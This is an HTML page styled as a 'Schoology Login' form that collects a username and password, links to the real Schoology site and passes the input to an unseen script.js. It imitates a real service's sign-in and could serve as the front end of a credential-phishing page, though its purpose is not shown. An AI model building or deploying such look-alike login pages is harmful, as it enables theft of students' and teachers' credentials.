<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
        <link rel="stylesheet" href="styles.css" />
    </head>
    <body>
    <h1 id="title">Schoology Login</h1>
    <form name="myform">
      <label>Name:</label> 
      <input type="text" placeholder="Username" class="form-control-sm" id="user" required>
      <label>Password: </label> 
      <input type="password" class="form-control-sm" placeholder="Password" id="pwd" required>
      <input class="form-check-input" type="checkbox" onclick="toggle()" id="pwd-toggle"><label class="inline-label">Show Password</label>
    </form>
    <a href="https://xs.schoology.com/login/forgot">Forgot password?</a>
    <br>
    <p>No account yet? </p><a href="https://xs.schoology.com/login">Sign up here</a>

    <input class="btn btn-primary" type="submit" value="Submit" onclick="combo()" />
    <p id="output"></p>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
  <script src="script.js"></script>
    </body>
</html>
